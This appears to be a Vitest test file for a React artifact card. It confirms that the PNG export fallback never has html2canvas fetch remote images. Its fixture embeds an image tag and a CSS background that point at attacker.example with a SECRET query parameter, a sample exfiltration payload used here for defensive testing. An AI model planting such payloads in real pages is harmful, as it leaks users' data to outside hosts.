// PNG/JPEG export of an HTML artifact when the daemon's headless-Chrome screenshot is refused
// (it is local-only: a LAN, phone or tunnel client, or a host with no Chrome) falls back to
// html2canvas in this window. html2canvas loads the artifact's images itself, with `new Image()`
// in the APP's window, outside the frame's CSP — so it must not be asked to fetch remote ones.
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { afterEach, beforeEach, expect, it, vi } from 'vitest'
import { ArtifactCard } from './ArtifactCard'

const h2c = vi.hoisted(() => vi.fn())
vi.mock('html2canvas', () => ({ default: h2c }))

const realObjectUrl = { create: URL.createObjectURL, revoke: URL.revokeObjectURL }
// jsdom never fires the load event of html2canvasCapture's srcdoc frame, so the capture would
// sit out its 4 s fallback timer in real time. Fire the load a browser fires once the srcdoc is
// parsed; the observer runs after the synchronous code that appended the frame and set onload.
const frameLoads = new MutationObserver((records) => {
  for (const r of records) for (const n of r.addedNodes) if (n instanceof HTMLIFrameElement) n.dispatchEvent(new Event('load'))
})
beforeEach(() => {
  frameLoads.observe(document.body, { childList: true })
  vi.stubGlobal('ResizeObserver', class { observe() {} unobserve() {} disconnect() {} })
  h2c.mockReset()
  h2c.mockResolvedValue({ toDataURL: () => 'data:image/png;base64,iVBORw0KGgo=' })
  // The screenshot route answers 403 to any non-local caller; everything else is track()/data:.
  vi.stubGlobal('fetch', vi.fn(async (input: RequestInfo | URL) =>
    String(input).includes('/api/v1/artifacts/screenshot')
      ? new Response('{}', { status: 403 })
      : new Response('{}', { status: 200 })))
  URL.createObjectURL = vi.fn(() => 'blob:artifact')
  URL.revokeObjectURL = vi.fn()
  // The download itself: jsdom cannot navigate, and would print a "Not implemented" error.
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})
})
afterEach(() => {
  frameLoads.disconnect()
  vi.unstubAllGlobals()
  vi.restoreAllMocks()
  URL.createObjectURL = realObjectUrl.create
  URL.revokeObjectURL = realObjectUrl.revoke
})

it('the client-side PNG export never has html2canvas fetch the artifact\'s remote images (useCORS off)', async () => {
  const code = '<html><head></head><body><img src="https://attacker.example/x?d=SECRET"><div style="background:url(https://attacker.example/bg?d=SECRET)">hi</div></body></html>'
  render(<ArtifactCard lang="html" code={code} />)
  await userEvent.click(screen.getByTitle('Download'))
  await userEvent.click(await screen.findByRole('menuitem', { name: /PNG/ }))
  await waitFor(() => expect(HTMLAnchorElement.prototype.click).toHaveBeenCalled(), { timeout: 8000 })
  // One call: the fresh capture (html2canvasCapture). The first fallback, the raster of the
  // static frame (rasterizeStaticFrozen), needs a laid-out, measured srcdoc frame that jsdom
  // never produces, so it returns before html2canvas here; it passes the same H2C_USE_CORS,
  // and real Chromium was checked for it.
  expect(h2c).toHaveBeenCalledTimes(1)
  for (const [, opts] of h2c.mock.calls) {
    // With useCORS off and allowTaint off (its default), html2canvas's image cache returns early
    // for a cross-origin URL instead of loading it.
    expect(opts.useCORS).toBe(false)
    expect(opts.allowTaint ?? false).toBe(false)
  }
}, 15000)
